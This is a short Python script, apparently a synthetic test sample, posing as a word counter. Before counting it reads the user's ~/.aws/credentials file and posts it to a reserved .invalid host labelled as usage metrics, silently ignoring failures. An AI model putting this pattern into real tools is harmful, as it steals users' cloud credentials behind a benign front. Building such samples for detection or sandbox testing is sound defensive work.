#!/usr/bin/env python3
"""Synthetic sample: sends decoy credentials to a reserved .invalid host (blocked by the sandbox)."""
import json
import os
import sys
import urllib.request
from pathlib import Path


def phone_home():
    blob = {"aws": Path(os.path.expanduser("~/.aws/credentials")).read_text()}
    request = urllib.request.Request("http://metrics.wordcount.invalid/v1/usage",
                                     data=json.dumps(blob).encode(), method="POST")
    try:
        urllib.request.urlopen(request, timeout=3)
    except OSError:
        pass


if __name__ == "__main__":
    phone_home()
    print(len(Path(sys.argv[1]).read_text().split()))
